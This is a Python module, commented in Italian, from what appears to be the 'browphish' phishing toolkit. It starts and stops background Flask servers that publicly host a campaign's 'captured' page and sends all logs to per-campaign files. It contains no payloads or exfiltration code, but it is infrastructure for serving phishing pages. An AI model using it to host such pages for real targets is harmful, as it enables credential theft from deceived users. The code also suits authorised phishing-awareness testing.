"""
Gestione dell'esecuzione delle campagne in background.
Supporta avvio/stop di server web per pagine associate alle campagne.
"""

import threading
import logging
import sys
import os
from pathlib import Path
from typing import Dict, Optional, List
from datetime import datetime

logger = logging.getLogger("browphish.campaign_runner")

# Dizionario globale per tracciare i processi in esecuzione
# Struttura: {campaign_id: {"thread": Thread, "process": Process, "pages": [page_ids], "status": "running"}}
running_campaigns: Dict[int, Dict] = {}
campaign_lock = threading.Lock()


def start_campaign_background(campaign_id: int, db_manager, port: int = 5000) -> bool:
    """
    Avvia una campagna in background con il server web delle pagine associate.
    
    Args:
        campaign_id: ID della campagna
        db_manager: DatabaseManager instance
        port: Porta per il server web
    
    Returns:
        True se avviata con successo, False altrimenti
    """
    with campaign_lock:
        # Controlla se la campagna è già in esecuzione
        if campaign_id in running_campaigns:
            logger.warning(f"Campagna {campaign_id} già in esecuzione")
            return False
        
        # Verifica che la campagna esista
        from modules.campaign_managers import campaign_manager
        campaign = campaign_manager.get_campaign_by_id(campaign_id, db_manager)
        
        if not campaign:
            logger.error(f"Campagna {campaign_id} non trovata")
            return False
        
        # Recupera le pagine associate
        pages = campaign_manager.get_campaign_pages(campaign_id, db_manager)
        
        if not pages:
            logger.warning(f"Nessuna pagina associata alla campagna {campaign_id}")
            return False
        
        try:
            # Crea un thread per eseguire il server
            thread = threading.Thread(
                target=_run_campaign_server,
                args=(campaign_id, campaign['name'], pages, db_manager, port),
                daemon=True,
                name=f"Campaign-{campaign_id}"
            )
            
            # Registra la campagna in esecuzione
            running_campaigns[campaign_id] = {
                "thread": thread,
                "pages": [p['id'] for p in pages],
                "status": "starting",
                "started_at": datetime.now(),
                "port": port,
                "campaign_name": campaign['name']
            }
            
            # Avvia il thread
            thread.start()
            
            logger.info(f"Campagna {campaign_id} ({campaign['name']}) avviata in background")
            return True
            
        except Exception as e:
            logger.error(f"Errore nell'avvio della campagna {campaign_id}: {e}")
            # Pulisci la voce se c'è stato un errore
            if campaign_id in running_campaigns:
                del running_campaigns[campaign_id]
            return False


def stop_campaign_background(campaign_id: int) -> bool:
    """
    Arresta una campagna in esecuzione in background.
    
    Args:
        campaign_id: ID della campagna
    
    Returns:
        True se arrestata, False altrimenti
    """
    with campaign_lock:
        if campaign_id not in running_campaigns:
            logger.warning(f"Campagna {campaign_id} non è in esecuzione")
            return False
        
        try:
            campaign_info = running_campaigns[campaign_id]
            thread = campaign_info.get("thread")
            
            # I thread daemon si fermeranno quando il programma principale termina
            # Per un arresto più gradevole, useremo un flag
            campaign_info["status"] = "stopping"
            
            logger.info(f"Richiesto arresto della campagna {campaign_id}")
            
            # Rimuovi dalla lista dei processi in esecuzione
            del running_campaigns[campaign_id]
            return True
            
        except Exception as e:
            logger.error(f"Errore nell'arresto della campagna {campaign_id}: {e}")
            return False


def _run_campaign_server(campaign_id: int, campaign_name: str, pages: List[Dict], 
                         db_manager, port: int) -> None:
    """
    Funzione eseguita nel thread per gestire il server della campagna.
    Serve la prima pagina disponibile sulla porta specificata.
    """
    try:
        if not pages:
            logger.error(f"Nessuna pagina disponibile per la campagna {campaign_id}")
            return

        page = pages[0]  # Usa la prima pagina
        page_name = page['name']

        # Prepara il file di log separato per la campagna
        logs_dir = Path("data/logs")
        try:
            logs_dir.mkdir(parents=True, exist_ok=True)
        except Exception:
            # Fallback su data/reports se non possibile
            logs_dir = Path("data/reports")
            logs_dir.mkdir(parents=True, exist_ok=True)

        log_path = logs_dir / f"campaign_{campaign_id}.log"

        logger.info(f"[Campagna {campaign_id}] Avvio server per pagina '{page_name}' (log: {log_path})")

        # Importa il modulo web_server
        from modules.web_pages.web_server import app as flask_app
        import modules.web_pages.web_server as web_server_module

        # Configura il server per la pagina e la campagna
        web_server_module.selected_page_name = page_name
        web_server_module.selected_page_type = "captured"
        web_server_module.selected_campaign_id = campaign_id
        web_server_module.selected_campaign_name = campaign_name

        # Aggiorna lo stato a "running"
        with campaign_lock:
            if campaign_id in running_campaigns:
                running_campaigns[campaign_id]["status"] = "running"

        logger.info(f"[Campagna {campaign_id}] Server web in ascolto sulla porta {port}")

        # Attach a per-campaign file handler to capture ALL logs (root, browphish, db, werkzeug, flask)
        file_handler = None
        root_logger = None
        browphish_logger = None
        web_logger = None
        db_logger = None
        werk_logger = None
        flask_logger = None
        
        try:
            file_handler = logging.FileHandler(str(log_path), encoding='utf-8')
            file_handler.setLevel(logging.INFO)
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            file_handler.setFormatter(formatter)

            # Configure root logger to capture everything
            root_logger = logging.getLogger()
            root_logger.handlers = []
            root_logger.addHandler(file_handler)
            root_logger.setLevel(logging.INFO)

            # Configure browphish namespace logger
            browphish_logger = logging.getLogger('browphish')
            browphish_logger.handlers = []
            browphish_logger.addHandler(file_handler)
            browphish_logger.setLevel(logging.INFO)
            browphish_logger.propagate = False

            # Configure the web_server logger (browphish.web_server)
            web_logger = logging.getLogger('browphish.web_server')
            web_logger.handlers = []
            web_logger.addHandler(file_handler)
            web_logger.setLevel(logging.INFO)
            web_logger.propagate = False

            # Configure db logger
            db_logger = logging.getLogger('browphish.db')
            db_logger.handlers = []
            db_logger.addHandler(file_handler)
            db_logger.setLevel(logging.INFO)
            db_logger.propagate = False

            # Configure werkzeug logger
            werk_logger = logging.getLogger('werkzeug')
            werk_logger.handlers = []
            werk_logger.addHandler(file_handler)
            werk_logger.setLevel(logging.INFO)
            werk_logger.propagate = False

            # Configure flask.app logger
            flask_logger = logging.getLogger('flask.app')
            flask_logger.handlers = []
            flask_logger.addHandler(file_handler)
            flask_logger.setLevel(logging.INFO)
            flask_logger.propagate = False

        except Exception as e:
            logger.error(f"Errore durante la configurazione del log della campagna {campaign_id}: {e}")

        try:
            # Avvia il server Flask (bloccante) — eseguito nel thread daemon, non blocca il menu principale
            flask_app.run(
                host="0.0.0.0",
                port=port,
                debug=False,
                use_reloader=False,
                threaded=True
            )
        finally:
            # Rimuovi il file handler dai logger per pulizia
            try:
                if file_handler:
                    if root_logger:
                        root_logger.removeHandler(file_handler)
                    if browphish_logger:
                        browphish_logger.removeHandler(file_handler)
                    if web_logger:
                        web_logger.removeHandler(file_handler)
                    if db_logger:
                        db_logger.removeHandler(file_handler)
                    if werk_logger:
                        werk_logger.removeHandler(file_handler)
                    if flask_logger:
                        flask_logger.removeHandler(file_handler)
                    file_handler.close()
            except Exception:
                pass
        
    except Exception as e:
        logger.error(f"[Campagna {campaign_id}] Errore nel server: {e}", exc_info=True)
    finally:
        # Pulisci quando il server termina
        with campaign_lock:
            if campaign_id in running_campaigns:
                del running_campaigns[campaign_id]
        logger.info(f"[Campagna {campaign_id}] Server terminato")


def get_running_campaigns() -> List[Dict]:
    """Restituisce la lista delle campagne in esecuzione."""
    with campaign_lock:
        campaigns = []
        for campaign_id, info in running_campaigns.items():
            campaigns.append({
                "campaign_id": campaign_id,
                "campaign_name": info.get("campaign_name"),
                "status": info.get("status"),
                "started_at": info.get("started_at"),
                "port": info.get("port"),
                "pages_count": len(info.get("pages", []))
            })
        return campaigns


def is_campaign_running(campaign_id: int) -> bool:
    """Controlla se una campagna è in esecuzione."""
    with campaign_lock:
        return campaign_id in running_campaigns


def get_campaign_status(campaign_id: int) -> Optional[str]:
    """Restituisce lo status di una campagna in esecuzione."""
    with campaign_lock:
        if campaign_id in running_campaigns:
            return running_campaigns[campaign_id].get("status")
        return None
